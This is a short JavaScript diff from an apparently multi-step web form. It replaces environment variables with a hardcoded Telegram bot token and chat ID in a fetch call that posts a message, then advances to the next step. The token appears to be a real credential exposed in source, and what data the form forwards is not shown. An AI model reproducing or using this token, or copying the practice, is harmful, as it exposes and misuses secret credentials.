@@ -45,10 +45,10 @@
                 });
 
                 try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    await fetch(`https://api.telegram.org/bot7942551419:AAGr8sj_Utwfva-05RusEC255TrguVEsOO0/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                        body: JSON.stringify({ chat_id:'829634068', text: message, parse_mode: 'Markdown' })
                     });
                     setStep(8);
                 } catch (error) {
